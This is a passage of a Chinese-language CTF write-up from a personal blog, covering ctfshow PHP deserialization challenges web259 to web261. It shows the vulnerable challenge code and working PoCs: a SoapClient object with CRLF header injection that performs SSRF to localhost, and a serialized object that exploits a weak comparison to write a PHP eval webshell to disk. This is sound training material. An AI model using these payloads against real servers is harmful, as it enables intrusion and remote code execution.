+<pre><code class="language-php">$xff = explode(&#039;,&#039;, $_SERVER[&#039;HTTP_X_FORWARDED_FOR&#039;]);
+array_pop($xff);
+$ip = array_pop($xff);
+
+if($ip!==&#039;127.0.0.1&#039;){
+    die(&#039;error&#039;);
+}else{
+    $token = $_POST[&#039;token&#039;];
+    if($token==&#039;ctfshow&#039;){
+        file_put_contents(&#039;flag.txt&#039;,$flag);
+    }
+}</code></pre>
+<p>题目给出flag.php的部分代码。大概逻辑就是让xff为127.0.0.1时，传入token=ctfshow得到flag，这里伪造xff失败了。</p>
+<p>进入题目</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+$vip = unserialize($_GET[&#039;vip&#039;]);
+//vip can get flag one key
+$vip-&gt;getFlag();</code></pre>
+<p>这里只有一个反序列化，没有其他代码。</p>
+<p>因此这题需要利用原生类的反序列化来实现SSRF，SoapClient原生类的反序列化</p>
+<p>​ SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一<br>
+种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果<br>
+去调用了一个不存在的函数，会去调用 __call 方法 。</p>
+<p><img loading="lazy" src="/uploads/2022/04/DNSlog%e5%88%a9%e7%94%a8%e5%a7%bf%e5%8a%bf%e6%80%bb%e7%bb%93.png" alt=""  />
+</p>
+<p>xff要array_pop两次,取第二次的值赋值给<code>$IP</code></p>
+<p>CRLF注入攻击</p>
+<p>CRLF是“回车+换行”（\r\n）的简称，其十六进制编码分别为0x0d和0x0a。在HTTP协议中，HTTP<br>
+header与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中。</p>
+<p>根据请求包构造一下就行。</p>
+<pre><code class="language-php">&lt;?php
+$a = new SoapClient(null,array(&#039;user_agent&#039; =&gt; "aaa\r\nx-forwarded-for:127.0.0.1,127.0.0.1\r\nContent-type:application/x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken=ctfshow",&#039;uri&#039; =&gt; &#039;aaa&#039;,&#039;location&#039; =&gt; &#039;http://127.0.0.1/flag.php&#039;));
+echo urlencode(serialize($a));</code></pre>
+<h2 id="web260">web260<a hidden class="anchor" aria-hidden="true" href="#web260">#</a></h2>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+highlight_file(__FILE__);
+include(&#039;flag.php&#039;);
+
+if(preg_match(&#039;/ctfshow_i_love_36D/&#039;,serialize($_GET[&#039;ctfshow&#039;]))){
+    echo $flag;
+}</code></pre>
+<p>无话可说直接poc吧：</p>
+<pre><code class="language-php">&lt;?php
+
+echo urlencode(serialize(&#039;ctfshow_i_love_36D&#039;));</code></pre>
+<h2 id="web261">web261<a hidden class="anchor" aria-hidden="true" href="#web261">#</a></h2>
+<p>如果类中同时定义了 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize">__unserialize()</a> 和 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> 两个魔术方法，则只有 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize">__unserialize()</a> 方法会生效，<a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> 方法会被忽略。</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+class ctfshowvip{
+    public $username;
+    public $password;
+    public $code;
+
+    public function __construct($u,$p){
+        $this-&gt;username=$u;
+        $this-&gt;password=$p;
+    }
+    public function __wakeup(){
+        if($this-&gt;username!=&#039;&#039; || $this-&gt;password!=&#039;&#039;){
+            die(&#039;error&#039;);
+        }
+    }
+    public function __invoke(){
+        eval($this-&gt;code);
+    }
+
+    public function __sleep(){
+        $this-&gt;username=&#039;&#039;;
+        $this-&gt;password=&#039;&#039;;
+    }
+    public function __unserialize($data){
+        $this-&gt;username=$data[&#039;username&#039;];
+        $this-&gt;password=$data[&#039;password&#039;];
+        $this-&gt;code = $this-&gt;username.$this-&gt;password;
+    }
+    public function __destruct(){
+        if($this-&gt;code==0x36d){
+            file_put_contents($this-&gt;username, $this-&gt;password);
+        }
+    }
+}
+
+unserialize($_GET[&#039;vip&#039;]);</code></pre>
+<p>__destruct()这里的$this-&gt;code==0x36d，0x36d是数字型，而且是弱等于，可以绕过。</p>
+<p>0x36d=877</p>
+<p>poc:</p>
+<pre><code class="language-php">&lt;?php
+class ctfshowvip{
+    public $username;
+    public $password;
+
+    public function __construct(){
+        $this-&gt;username=$u=&#039;877.php&#039;;
+        $this-&gt;password=$p=&#039;&lt;?php @eval($_POST[1]);?&gt;&#039;;
+    }
+}
+echo urlencode(serialize(new ctfShowvip()));</code></pre>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
